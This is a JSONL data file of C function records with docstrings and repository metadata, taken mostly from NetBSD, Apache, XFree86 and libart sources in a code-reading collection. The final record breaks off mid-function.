{"docstring": "/*************************************************************************\n* This function is my wrapper around malloc\n**************************************************************************/\n", "func_signal": "void *gk_malloc(size_t nbytes, char *msg)", "code": "{\n  return malloc(nbytes);\n  void *ptr;\n\n  if (nbytes == 0)\n    return NULL;\n\n#ifdef GKMSPACE\n  if (gk_mspace == 0)\n    gk_mspace = create_mspace(0, 0);\n\n  if (gk_mspace == NULL)\n    gk_errexit(SIGMEM, \"***Memory allocation failed for creating gk_mspace.\");\n\n  ptr = (void *)mspace_malloc(gk_mspace, nbytes);\n#else\n  ptr = (void *)dlmalloc(nbytes);\n#endif\n\n  if (ptr == NULL) {\n#ifdef WIN32\n    printf(\"   Maximum memory used:              %10Iu bytes\\n\", gk_GetMaxMemoryUsed());\n    printf(\"   Current memory used:              %10Iu bytes\\n\", gk_GetCurMemoryUsed());\n#endif\n#ifdef SUNOS\n    printf(\"   Maximum memory used:              %10lu bytes\\n\", gk_GetMaxMemoryUsed());\n    printf(\"   Current memory used:              %10lu bytes\\n\", gk_GetCurMemoryUsed());\n#endif\n#ifdef LINUX\n    printf(\"   Maximum memory used:              %10zu bytes\\n\", gk_GetMaxMemoryUsed());\n    printf(\"   Current memory used:              %10zu bytes\\n\", gk_GetCurMemoryUsed());\n#endif\n\n    gk_errexit(SIGMEM, \"***Memory allocation failed for %s. Requested size: %zd bytes\", msg, nbytes);\n  }\n\n  return ptr;\n}", "path": "src\\graphlab\\extern\\metis\\GKlib\\memory.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*\n * Read a label from disk into a sysist label structure.\n */\n", "func_signal": "int incorelabel(const char *dkname, partinfo *lp)", "code": "{\n\tstruct disklabel lab;\n\tint fd;\n\tint i, maxpart;\n\tstruct partition *pp;\n\tchar nambuf[STRSIZE];\n\n\tfd = opendisk(dkname, O_RDONLY,  nambuf, STRSIZE, 0);\n\n\tif (ioctl(fd, DIOCGDINFO, &lab) < 0) {\n\t\t/*XXX err(4, \"ioctl DIOCGDINFO\");*/\n\t\treturn(errno);\n\t}\n\tclose(fd);\n\n\tmaxpart = getmaxpartitions();\n\tif (maxpart > 16) maxpart = 16;\n\n\n\t/* XXX set globals used by MD code to compute disk size? */\n\t\n\tpp = &lab.d_partitions[0];\n\temptylabel(lp);\n\tfor (i = 0; i < maxpart; i++) {\n\t\ttranslate_partinfo(lp+i, pp+i);\n\t}\n\n\treturn (0);\n}", "path": "netbsdsrc\\distrib\\utils\\sysinst\\label.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Return 1 iff partition i in lp should be ignored when checking\n * for  overlapping partitions.\n */\n", "func_signal": "static int\nboringpart(partinfo *lp, int i, int rawpart, int bsdpart)", "code": "{\n\n\tif (i == rawpart || i == bsdpart ||\n\t    lp[i][D_FSTYPE] == T_UNUSED || lp[i][D_SIZE] == 0)\n\t\treturn 1;\n\treturn 0;\n}", "path": "netbsdsrc\\distrib\\utils\\sysinst\\label.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Wait for request-line to become inactive. When it doesn't return 0.\n * Otherwise return != 0.\n */\n", "func_signal": "extern __inline__ int wait_req_false(void)", "code": "{\n\tint\ttimeout = 250000;\n\n\twhile ((GET_5380_REG(NCR5380_IDSTAT) & SC_S_REQ) && --timeout)\n\t\tdelay(1);\n\treturn (!(GET_5380_REG(NCR5380_IDSTAT) & SC_S_REQ));\n}", "path": "netbsdsrc\\sys\\arch\\atari\\dev\\ncr5380.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Check a sysinst label structure for overlapping partitions.\n * Returns 0 if no overlapping partition found, nonzero otherwise.\n * Sets reference arguments ovly1 and ovly2 to the indices of\n * overlapping partitions if any are found.\n */\n", "func_signal": "int\nchecklabel(partinfo *lp, int nparts, int rawpart, int bsdpart, \n\t   int *ovly1, int *ovly2)", "code": "{\n\tint i;\n\tint j;\n\n\t*ovly1 = -1;\n\t*ovly2 = -1;\n\n\tfor (i = 0; i < nparts - 1; i ++ ) {\n\t\tint  *ip = lp[i];\n\t\tint istart, istop;\n\n\t\t/* skip unused or reserved partitions */\n\t\tif (boringpart(lp, i, rawpart, bsdpart))\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * check succeding partitions for overlap.\n\t\t * O(n^2), but n is small (currently <= 16).\n\t\t */\n\t\tistart = ip[D_OFFSET];\n\t\tistop = istart + ip[D_SIZE];\n\n\t\tfor (j = i+1; j < nparts; j++) {\n\t\t\tint  *jp = lp[j];\n\t\t\tint jstart, jstop;\n\n\t\t\t/* skip unused or reserved partitions */\n\t\t\tif (boringpart(lp, j, rawpart, bsdpart))\n\t\t\t\tcontinue;\n\n\t\t\tjstart = jp[D_OFFSET];\n\t\t\tjstop = jstart + jp[D_SIZE];\n\n\t\t\t/* overlap? */\n\t\t\tif ((istart <= jstart && jstart < istop) ||\n\t\t\t    (jstart <= istart && istart < jstop)) {\n\t\t\t\t*ovly1 = i;\n\t\t\t\t*ovly2 = j;\n\t\t\t\treturn(1);\n\t\t\t}\n\t\t}\n\t}\n\n\treturn(0);\n}", "path": "netbsdsrc\\distrib\\utils\\sysinst\\label.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/**\n * art_rect_list_from_uta: Decompose uta into list of rectangles.\n * @uta: The source uta.\n * @max_width: The maximum width of the resulting rectangles.\n * @max_height: The maximum height of the resulting rectangles.\n * @p_nrects: Where to store the number of returned rectangles.\n *\n * Allocates a new list of rectangles, sets *@p_nrects to the number\n * in the list. This list should be freed with art_free().\n *\n * Each rectangle bounded in size by (@max_width, @max_height).\n * However, these bounds must be at least the size of one tile.\n *\n * This routine provides a precise implementation, i.e. the rectangles\n * cover exactly the same area as the uta. It is thus appropriate in\n * cases where the overhead per rectangle is small compared with the\n * cost of filling in extra pixels.\n *\n * Return value: An array containing the resulting rectangles.\n **/\n", "func_signal": "ArtIRect *\nart_rect_list_from_uta (ArtUta *uta, int max_width, int max_height,\n\t\t\tint *p_nrects)", "code": "{\n  ArtIRect *rects;\n  int n_rects, n_rects_max;\n  int x, y;\n  int width, height;\n  int ix;\n  int left_ix;\n  ArtUtaBbox *utiles;\n  ArtUtaBbox bb;\n  int x0, y0, x1, y1;\n  int *glom;\n  int glom_rect;\n\n  n_rects = 0;\n  n_rects_max = 1;\n  rects = art_new (ArtIRect, n_rects_max);\n\n  width = uta->width;\n  height = uta->height;\n  utiles = uta->utiles;\n\n  glom = art_new (int, width * height);\n  for (ix = 0; ix < width * height; ix++)\n    glom[ix] = -1;\n\n  ix = 0;\n  for (y = 0; y < height; y++)\n    for (x = 0; x < width; x++)\n      {\n\tbb = utiles[ix];\n\tif (bb)\n\t  {\n\t    x0 = ((uta->x0 + x) << ART_UTILE_SHIFT) + ART_UTA_BBOX_X0(bb);\n\t    y0 = ((uta->y0 + y) << ART_UTILE_SHIFT) + ART_UTA_BBOX_Y0(bb);\n\t    y1 = ((uta->y0 + y) << ART_UTILE_SHIFT) + ART_UTA_BBOX_Y1(bb);\n\n\t    left_ix = ix;\n\t    /* now try to extend to the right */\n\t    while (x != width - 1 &&\n\t\t   ART_UTA_BBOX_X1(bb) == ART_UTILE_SIZE &&\n\t\t   (((bb & 0xffffff) ^ utiles[ix + 1]) & 0xffff00ff) == 0 &&\n\t\t   (((uta->x0 + x + 1) << ART_UTILE_SHIFT) +\n\t\t    ART_UTA_BBOX_X1(utiles[ix + 1]) -\n\t\t    x0) <= max_width)\n\t      {\n\t\tbb = utiles[ix + 1];\n\t\tix++;\n\t\tx++;\n\t      }\n\t    x1 = ((uta->x0 + x) << ART_UTILE_SHIFT) + ART_UTA_BBOX_X1(bb);\n\n\n\t    /* if rectangle nonempty */\n\t    if ((x1 ^ x0) | (y1 ^ y0))\n\t      {\n\t\t/* try to glom onto an existing rectangle */\n\t\tglom_rect = glom[left_ix];\n\t\tif (glom_rect != -1 &&\n\t\t    x0 == rects[glom_rect].x0 &&\n\t\t    x1 == rects[glom_rect].x1 &&\n\t\t    y0 == rects[glom_rect].y1 &&\n\t\t    y1 - rects[glom_rect].y0 <= max_height)\n\t\t  {\n\t\t    rects[glom_rect].y1 = y1;\n\t\t  }\n\t\telse\n\t\t  {\n\t\t    if (n_rects == n_rects_max)\n\t\t      art_expand (rects, ArtIRect, n_rects_max);\n\t\t    rects[n_rects].x0 = x0;\n\t\t    rects[n_rects].y0 = y0;\n\t\t    rects[n_rects].x1 = x1;\n\t\t    rects[n_rects].y1 = y1;\n\t\t    glom_rect = n_rects;\n\t\t    n_rects++;\n\t\t  }\n\t\tif (y != height - 1)\n\t\t  glom[left_ix + width] = glom_rect;\n\t      }\n\t  }\n\tix++;\n      }\n\n  art_free (glom);\n  *p_nrects = n_rects;\n  return rects;\n}", "path": "vcf\\src\\Graphics\\art_rect_uta.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * init_restore\n *\trefresh the main display table.\n */\n", "func_signal": "void\ninit_restore()", "code": "{\n\tregister int row, col;\n\tregister int i;\n\t\n\tvoid  draw_current(), clear_screen(), print_entry();\n\n\tclear_screen();\n\n\tfor ( col = 0; col < MAX_COLS; ++col ) {\n\t\tmove( ROW_OFFSET - 2, col * 3 + COL_OFFSET + 1 );\n\t\tprintf( \"%d\", col );\n\t}\n\tmove( ROW_OFFSET - 1, COL_OFFSET );\n\tprintf( \"+--+--+--+--+--+--+--+--+\" );\n\tmove( ROW_OFFSET + MAX_ROWS * 2, COL_OFFSET );\n\tprintf( \"+--+--+--+--+--+--+--+--+\" );\n\n\tfor ( row = 0; row < MAX_ROWS; ++row ) {\n\t\tif ( row != 0 && row != 7 )  {\n\t\t\tmove( row * 2 + ROW_OFFSET, COL_OFFSET - 2 );\n\t\t\tprintf( \"%d|\", row );\n\t\t\tmove( row * 2 + ROW_OFFSET + 1, COL_OFFSET - 1 );\n\t\t\tprintf( \"|\" );\n\t\t\tmove( row * 2 + ROW_OFFSET, COL_OFFSET + MAX_COLS * 3 );\n\t\t\tprintf( \"|\" );\n\t\t\tmove( row * 2 + ROW_OFFSET + 1, COL_OFFSET + MAX_COLS * 3 );\n\t\t\tprintf( \"|\" );\n\t\t} else {\n\t\t\tmove( row * 2 + ROW_OFFSET, COL_OFFSET - 2 );\n\t\t\tprintf( \"%d*\", row );\n\t\t\tmove( row * 2 + ROW_OFFSET + 1, COL_OFFSET - 1 );\n\t\t\tprintf( \"*\" );\n\t\t\tmove( row * 2 + ROW_OFFSET, COL_OFFSET + MAX_COLS * 3 );\n\t\t\tprintf( \"*\" );\n\t\t\tmove( row * 2 + ROW_OFFSET + 1, COL_OFFSET + MAX_COLS * 3 );\n\t\t\tprintf( \"*\" );\n\t\t}\n\t}\n\tdraw_current();\n\n\tmove( TABLE_ROW - 1, TABLE_COL - 1 );\n\tprintf( \"+-+-+-+-+-+-+-+-+-+-+-+-+\" );\n\tmove( TABLE_ROW + 8 * 2 - 1, TABLE_COL - 1 );\n\tprintf( \"+-+-+-+-+-+-+-+-+-+-+-+-+\" );\n\tfor ( i = 0; i < 8; ++i ) {\n\t\tmove ( TABLE_ROW + i * 2, TABLE_COL - 1 );\n\t\tprintf( \"|\" );\n\t\tmove ( TABLE_ROW + i * 2 + 1, TABLE_COL - 1 );\n\t\tprintf( \"+\" );\n\t\tmove ( TABLE_ROW + i * 2, TABLE_COL + 12 * 2 - 1);\n\t\tprintf( \"|\" );\n\t\tmove ( TABLE_ROW + i * 2 + 1, TABLE_COL +12 * 2 - 1);\n\t\tprintf( \"+\" );\n\t}\t\n\tfor ( i = 0; i < TOTAL_ENTRIES; ++i )\n\t\tprint_entry( i, (i == current_entry) ? true : false );\n}", "path": "netbsdsrc\\sys\\arch\\i386\\isa\\pcvt\\Util\\fontedit\\fontedit.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * tgaVerticalRetraceWait --\n *     Polls until the vertical retrace is entered\n */\n", "func_signal": "void\ntgaVerticalRetraceWait()", "code": "{\n#if 0\n  unsigned long vctr, last_vctr; /* Current line position in vertical sweep */\n  for (vctr = last_vctr = tgaFetch(VRTC,CtlBase);  /* Prime the loop */\n       vctr >= last_vctr;\n       last_vctr = vctr, vctr = tgaFetch(VRTC,CtlBase));\n#endif\n}", "path": "XFree86-3.3\\xc\\programs\\Xserver\\hw\\xfree86\\accel\\tga\\tgacurs.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Prefix message with adapter info.\n */\n", "func_signal": "static void\nncr_aprint(struct ncr_softc *sc, char *fmt, ...)", "code": "{\n\tva_list\tap;\n\n\tva_start(ap, fmt);\n\tprintf(\"%s: %:\", sc->sc_dev.dv_xname, fmt, ap);\n\tva_end(ap);\n}", "path": "netbsdsrc\\sys\\arch\\atari\\dev\\ncr5380.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Prefix message with full target info.\n */\n", "func_signal": "static void\nncr_tprint(SC_REQ *reqp, char *fmt, ...)", "code": "{\n\tva_list\tap;\n\n\tva_start(ap, fmt);\n\tscsi_print_addr(reqp->xs->sc_link);\n\tprintf(\"%:\", fmt, ap);\n\tva_end(ap);\n}", "path": "netbsdsrc\\sys\\arch\\atari\\dev\\ncr5380.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Cause pending line to be printed\n */\n", "func_signal": "static void\nretype()", "code": "{\n    struct termios tty;\n\n    (void) tcgetattr(SHOUT, &tty);\n    tty.c_lflag |= PENDIN;\n    (void) tcsetattr(SHOUT, TCSADRAIN, &tty);\n}", "path": "netbsdsrc\\bin\\csh\\file.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Clear_screen\n */\n", "func_signal": "void\nclear_screen()", "code": "{\n\tprintf( \"\\033[H\\033[J\" );\t\t/* Clear screen.\t*/\n\tfflush( stdout );\n}", "path": "netbsdsrc\\sys\\arch\\i386\\isa\\pcvt\\Util\\fontedit\\fontedit.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Check a disklabel.\n * If there are overlapping active parititons,\n * Ask the user if they want to edit the parittion or give up.\n */\n", "func_signal": "int\nedit_and_check_label(partinfo *lp, int nparts, int rawpart, int bsdpart)", "code": "{\n\t while (1) {\n\t\t int i, j;\n\n\t\t /* first give the user the option to edit the label... */\n\t\t process_menu (MENU_fspartok);\n\n\t\t /* User thinks the label is OK. check for overlaps.*/\n\t\t if (checklabel(lp, nparts, rawpart, bsdpart, &i, &j) == 0) {\n\t\t\t/* partitions are OK. */\n\t\t\t return (1);\n\t\t }\n\t\t \n\t\t /* partitions overlap. */\n\t\t msg_display(MSG_partitions_overlap, 'a' + i, 'a' + j);\n\t\t /*XXX*/\n\t\t msg_display_add(MSG_edit_partitions_again);\n\t\t process_menu(MENU_yesno);\n\t\t if (!yesno)\n\t\t\t return(0);\n\t }\n\n\t/*NOTREACHED*/\n}", "path": "netbsdsrc\\distrib\\utils\\sysinst\\label.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Save the memory which is used by the current expression. This memory\n * is not freed by the next tfreeblk() call. The pointer returned can be\n * used to restore the memory.\n */\n", "func_signal": "mbl_t *\ntsave()", "code": "{\n\tmbl_t\t*tmem;\n\n\ttmem = tmblk;\n\ttmblk = NULL;\n\treturn (tmem);\n}", "path": "netbsdsrc\\usr.bin\\xlint\\lint1\\mem1.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Help\n *\tPrint out help information.\n */\n", "func_signal": "void\nhelp()", "code": "{\n\tprintf( \"Font editor\\n\\n\" );\n\tprintf( \"F6     - Pixel on\\n\" );\n\tprintf( \"F7     - Pixel off\\n\" );\n\tprintf( \"F13    - Clear display area\\n\" );\n\tprintf( \"HELP   - This screen\\n\" );\n\tprintf( \"FIND   - Update font table\\n\" );\n\tprintf( \"INSERT - Insert a blank row\\n\" );\n\tprintf( \"REMOVE - Remove a row\\n\" );\n\tprintf( \"SELECT - Select current font table entry\\n\" );\n\tprintf( \"PREV   - Move to previous font table entry\\n\" );\n\tprintf( \"NEXT   - Move to next font table entry\\n\" );\n\tprintf( \"^D     - Exit\\n\" );\n\tprintf( \"\\n\\n\\n\\nPress any key to continue\\n\" );\n}", "path": "netbsdsrc\\sys\\arch\\i386\\isa\\pcvt\\Util\\fontedit\\fontedit.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Carry out a request from the high level driver.\n */\n", "func_signal": "static int\nncr5380_scsi_cmd(struct scsipi_xfer *xs)", "code": "{\n\tint\tsps;\n\tSC_REQ\t*reqp, *link, *tmp;\n\tint\tflags = xs->flags;\n\n\t/*\n\t * We do not queue RESET commands\n\t */\n\tif (flags & SCSI_RESET) {\n\t\tscsi_reset_verbose(xs->sc_link->adapter_softc,\n\t\t\t\t   \"Got reset-command\");\n\t\treturn (COMPLETE);\n\t}\n\n\t/*\n\t * Get a request block\n\t */\n\tsps = splbio();\n\tif ((reqp = free_head) == 0) {\n\t\tsplx(sps);\n\t\treturn (TRY_AGAIN_LATER);\n\t}\n\tfree_head  = reqp->next;\n\treqp->next = NULL;\n\tsplx(sps);\n\n\t/*\n\t * Initialize our private fields\n\t */\n\treqp->dr_flag   = (flags & SCSI_POLL) ? DRIVER_NOINT : 0;\n\treqp->phase     = NR_PHASE;\n\treqp->msgout    = MSG_NOOP;\n\treqp->status    = SCSGOOD;\n\treqp->message   = 0xff;\n\treqp->link      = NULL;\n\treqp->xs        = xs;\n\treqp->targ_id   = xs->sc_link->scsipi_scsi.target;\n\treqp->targ_lun  = xs->sc_link->scsipi_scsi.lun;\n\treqp->xdata_ptr = (u_char*)xs->data;\n\treqp->xdata_len = xs->datalen;\n\tmemcpy(&reqp->xcmd, xs->cmd, sizeof(struct scsi_generic));\n\treqp->xcmd.bytes[0] |= reqp->targ_lun << 5;\n\n\t/*\n\t * Sanity check on flags...\n\t */\n\tif (flags & ITSDONE) {\n\t\tncr_tprint(reqp, \"scsi_cmd: command already done.....\\n\");\n\t\txs->flags &= ~ITSDONE;\n\t}\n\tif (!(flags & INUSE)) {\n\t\tncr_tprint(reqp, \"scsi_cmd: command not in use.....\\n\");\n\t\txs->flags |= INUSE;\n\t}\n\n#ifdef REAL_DMA\n\t/*\n\t * Check if DMA can be used on this request\n\t */\n\tif (scsi_dmaok(reqp))\n\t\treqp->dr_flag |= DRIVER_DMAOK;\n#endif /* REAL_DMA */\n\n\t/*\n\t * Insert the command into the issue queue. Note that 'REQUEST SENSE'\n\t * commands are inserted at the head of the queue since any command\n\t * will clear the existing contingent allegience condition and the sense\n\t * data is only valid while the condition exists.\n\t * When possible, link the command to a previous command to the same\n\t * target. This is not very sensible when AUTO_SENSE is not defined!\n\t * Interrupts are disabled while we are fiddling with the issue-queue.\n\t */\n\tsps = splbio();\n\tlink = NULL;\n\tif ((issue_q == NULL) || (reqp->xcmd.opcode == REQUEST_SENSE)) {\n\t\treqp->next = issue_q;\n\t\tissue_q    = reqp;\n\t}\n\telse {\n\t\ttmp  = issue_q;\n\t\tdo {\n\t\t    if (!link && (tmp->targ_id == reqp->targ_id) && !tmp->link)\n\t\t\t\tlink = tmp;\n\t\t} while (tmp->next && (tmp = tmp->next));\n\t\ttmp->next = reqp;\n#ifdef AUTO_SENSE\n\t\tif (link && (ncr_will_link & (1<<reqp->targ_id))) {\n\t\t\tlink->link = reqp;\n\t\t\tlink->xcmd.bytes[link->xs->cmdlen-2] |= 1;\n\t\t}\n#endif\n\t}\n#ifdef AUTO_SENSE\n\t/*\n\t * If we haven't already, check the target for link support.\n\t * Do this by prefixing the current command with a dummy\n\t * Request_Sense command, link the dummy to the current\n\t * command, and insert the dummy command at the head of the\n\t * issue queue.  Set the DRIVER_LINKCHK flag so that we'll\n\t * ignore the results of the dummy command, since we only\n\t * care about whether it was accepted or not.\n\t */\n\tif (!link && !(ncr_test_link & (1<<reqp->targ_id)) &&\n\t    (tmp = free_head) && !(reqp->dr_flag & DRIVER_NOINT)) {\n\t\tfree_head = tmp->next;\n\t\ttmp->dr_flag = (reqp->dr_flag & ~DRIVER_DMAOK) | DRIVER_LINKCHK;\n\t\ttmp->phase = NR_PHASE;\n\t\ttmp->msgout = MSG_NOOP;\n\t\ttmp->status = SCSGOOD;\n\t\ttmp->xs = reqp->xs;\n\t\ttmp->targ_id = reqp->targ_id;\n\t\ttmp->targ_lun = reqp->targ_lun;\n\t\tbcopy(sense_cmd, &tmp->xcmd, sizeof(sense_cmd));\n\t\ttmp->xdata_ptr = (u_char *)&tmp->xs->sense.scsi_sense;\n\t\ttmp->xdata_len = sizeof(tmp->xs->sense.scsi_sense);\n\t\tncr_test_link |= 1<<tmp->targ_id;\n\t\ttmp->link = reqp;\n\t\ttmp->xcmd.bytes[sizeof(sense_cmd)-2] |= 1;\n\t\ttmp->next = issue_q;\n\t\tissue_q = tmp;\n#ifdef DBG_REQ\n\t\tif (dbg_target_mask & (1 << tmp->targ_id))\n\t\t\tshow_request(tmp, \"LINKCHK\");\n#endif\n\t}\n#endif\n\tsplx(sps);\n\n#ifdef DBG_REQ\n\tif (dbg_target_mask & (1 << reqp->targ_id))\n\t\tshow_request(reqp, (reqp->xcmd.opcode == REQUEST_SENSE) ?\n\t\t\t\t\t\t\t\t\"HEAD\":\"TAIL\");\n#endif\n\n\trun_main(xs->sc_link->adapter_softc);\n\n\tif (xs->flags & (SCSI_POLL|ITSDONE))\n\t\treturn (COMPLETE); /* We're booting or run_main has completed */\n\treturn (SUCCESSFULLY_QUEUED);\n}", "path": "netbsdsrc\\sys\\arch\\atari\\dev\\ncr5380.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * draw_current\n *\tDraw the complete current entry.\n */\n", "func_signal": "void\ndraw_current()", "code": "{\n\tregister int row, col;\n\n\tprintf( \"\\033)0\" );\t\t/* Special graphics in G1\t*/\n\tprintf( \"\\016\" );\t\t/* Lock in G1 (SO)\t\t*/\n\n\tfor ( row = 0; row < MAX_ROWS; ++row ) {\n\t\tfor ( col = 0; col < MAX_COLS; ++col ) {\n\t\t\tif ( display_table[row][col] ) {\n\t\t\t\tmove( row * 2 + ROW_OFFSET,     col * 3 + COL_OFFSET );\n\t\t\t\tprintf( \"\\141\\141\\141\" );\n\t\t\t\tmove( row * 2 + ROW_OFFSET + 1, col * 3 + COL_OFFSET );\n\t\t\t\tprintf( \"\\141\\141\\141\" );\n\t\t\t} else {\n\t\t\t\tmove( row * 2 + ROW_OFFSET,     col * 3 + COL_OFFSET );\n\t\t\t\tprintf( \"   \" ); \t/* erase splat\t*/\n\t\t\t\tmove( row * 2 + ROW_OFFSET + 1, col * 3 + COL_OFFSET );\n\t\t\t\tprintf( \"   \" ); \t/* erase splat\t*/\n\t\t\t}\n\t\t}\n\t\tpad();\n\t}\n\tprintf( \"\\017\" );\t\t/* Lock in G0 (SI)\t*/\n\tfflush( stdout );\n}", "path": "netbsdsrc\\sys\\arch\\i386\\isa\\pcvt\\Util\\fontedit\\fontedit.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/* check_code() parse 'code' and return NULL or an error response\n * string.  If we return NULL then real_code contains code converted\n * to the cnnnn format.\n */\n", "func_signal": "static char *check_code(pool *p, const char *code, char **real_code)", "code": "{\n    char *word;\n    char base = 'X';\n    int modifier = 0;\n    int num = 0;\n    int factor = 0;\n\n    /* 0.0.4 compatibility?\n     */\n    if ((code[0] == 'A') || (code[0] == 'M')) {\n        *real_code = (char *)code;\n        return NULL;\n    };\n\n    /* <base> [plus] {<num> <type>}*\n     */\n\n    /* <base>\n     */\n    word = ap_getword_conf(p, &code);\n    if (!strncasecmp(word, \"now\", 1) ||\n        !strncasecmp(word, \"access\", 1)) {\n        base = 'A';\n    }\n    else if (!strncasecmp(word, \"modification\", 1)) {\n        base = 'M';\n    }\n    else {\n        return ap_pstrcat(p, \"bad expires code, unrecognised <base> '\",\n                       word, \"'\", NULL);\n    };\n\n    /* [plus]\n     */\n    word = ap_getword_conf(p, &code);\n    if (!strncasecmp(word, \"plus\", 1)) {\n        word = ap_getword_conf(p, &code);\n    };\n\n    /* {<num> <type>}*\n     */\n    while (word[0]) {\n        /* <num>\n         */\n        if (ap_isdigit(word[0])) {\n            num = atoi(word);\n        }\n        else {\n            return ap_pstrcat(p, \"bad expires code, numeric value expected <num> '\",\n                           word, \"'\", NULL);\n        };\n\n        /* <type>\n         */\n        word = ap_getword_conf(p, &code);\n        if (word[0]) {\n            /* do nothing */\n        }\n        else {\n            return ap_pstrcat(p, \"bad expires code, missing <type>\", NULL);\n        };\n\n        factor = 0;\n        if (!strncasecmp(word, \"years\", 1)) {\n            factor = 60 * 60 * 24 * 365;\n        }\n        else if (!strncasecmp(word, \"months\", 2)) {\n            factor = 60 * 60 * 24 * 30;\n        }\n        else if (!strncasecmp(word, \"weeks\", 1)) {\n            factor = 60 * 60 * 24 * 7;\n        }\n        else if (!strncasecmp(word, \"days\", 1)) {\n            factor = 60 * 60 * 24;\n        }\n        else if (!strncasecmp(word, \"hours\", 1)) {\n            factor = 60 * 60;\n        }\n        else if (!strncasecmp(word, \"minutes\", 2)) {\n            factor = 60;\n        }\n        else if (!strncasecmp(word, \"seconds\", 1)) {\n            factor = 1;\n        }\n        else {\n            return ap_pstrcat(p, \"bad expires code, unrecognised <type>\",\n                           \"'\", word, \"'\", NULL);\n        };\n\n        modifier = modifier + factor * num;\n\n        /* next <num>\n         */\n        word = ap_getword_conf(p, &code);\n    };\n\n    *real_code = ap_psprintf(p, \"%c%d\", base, modifier);\n\n    return NULL;\n}", "path": "apache\\src\\modules\\standard\\mod_expires.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * pad\n *\tEmit nulls so that the terminal can catch up.\n */\n", "func_signal": "pad()", "code": "{\n\tint i;\n\n\tfor ( i = 0; i < 20; ++i )\n\t\tputchar( '\\000' );\n\tfflush( stdout );\n}", "path": "netbsdsrc\\sys\\arch\\i386\\isa\\pcvt\\Util\\fontedit\\fontedit.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n * Check results of a DMA data-transfer.\n */\n", "func_signal": "static int\ndma_ready()", "code": "{\n\tSC_REQ\t*reqp = connected;\n\tint\tdmstat, is_edma;\n\tlong\tbytes_left, bytes_done;\n\n\tis_edma = get_dma_result(reqp, &bytes_left);\n\tdmstat  = GET_5380_REG(NCR5380_DMSTAT);\n\n\t/*\n\t * Check if the call is sensible and not caused by any spurious\n\t * interrupt.\n\t */\n\tif (!is_edma && !(dmstat & (SC_END_DMA|SC_BSY_ERR))\n\t\t     && (dmstat & SC_PHS_MTCH) ) {\n\t\tncr_tprint(reqp, \"dma_ready: spurious call \"\n\t\t\t\t \"(dm:%x,last_hit: %s)\\n\",\n#ifdef DBG_PID\n\t\t\t\t\tdmstat, last_hit[DBG_PID-1]);\n#else\n\t\t\t\t\tdmstat, \"unknown\");\n#endif\n\t\treturn (0);\n\t}\n\n\t/*\n\t * Clear all (pending) interrupts.\n\t */\n\tscsi_clr_ipend();\n\n\t/*\n\t * Update various transfer-pointers/lengths\n\t */\n\tbytes_done = reqp->dm_cur->dm_count - bytes_left;\n\n\tif ((reqp->dr_flag & DRIVER_BOUNCING) && (PH_IN(reqp->phase))) {\n\t\t/*\n\t\t * Copy the bytes read until now from the bounce buffer\n\t\t * to the 'real' destination. Flush the data-cache\n\t\t * before copying.\n\t\t */\n\t\tPCIA();\n\t\tbcopy(reqp->bouncerp, reqp->xdata_ptr, bytes_done);\n\t\treqp->bouncerp += bytes_done;\n\t}\n\n\treqp->xdata_ptr  = &reqp->xdata_ptr[bytes_done];\t/* XXX */\n\treqp->xdata_len -= bytes_done;\t\t\t\t/* XXX */\n\tif ((reqp->dm_cur->dm_count -= bytes_done) == 0)\n\t\treqp->dm_cur++;\n\telse reqp->dm_cur->dm_addr += bytes_done;\n\n\tif (PH_IN(reqp->phase) && (dmstat & SC_PAR_ERR)) {\n\t\tif (!(ncr5380_no_parchk & (1 << reqp->targ_id))) {\n\t\t\tncr_tprint(reqp, \"parity error in data-phase\\n\");\n\t\t\treqp->xs->error = XS_TIMEOUT;\n\t\t}\n\t}\n\n\t/*\n\t * DMA mode should always be reset even when we will continue with the\n\t * next chain. It is also essential to clear the MON_BUSY because\n\t * when LOST_BUSY is unexpectedly set, we will not be able to drive\n\t * the bus....\n\t */\n\tSET_5380_REG(NCR5380_MODE, IMODE_BASE);\n\n\n\tif ((dmstat & SC_BSY_ERR) || !(dmstat & SC_PHS_MTCH)\n\t\t || (reqp->dm_cur > reqp->dm_last) || (reqp->xs->error)) {\n\n\t\t/*\n\t\t * Tell interrupt functions DMA mode has ended.\n\t\t */\n\t\treqp->dr_flag &= 